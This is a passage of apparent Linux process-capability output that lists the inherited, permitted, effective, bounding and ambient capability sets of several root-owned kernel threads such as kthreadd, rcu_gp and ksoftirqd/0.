  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 2 (kthreadd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 3 (rcu_gp) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 4 (rcu_par_gp) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 5 (slub_flushwq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 6 (netns) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 8 (kworker/0:0H-events_highpri) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 10 (mm_percpu_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 11 (rcu_tasks_kthread) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 12 (rcu_tasks_rude_kthread) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 13 (rcu_tasks_trace_kthread) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 14 (ksoftirqd/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 15 (rcu_preempt) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
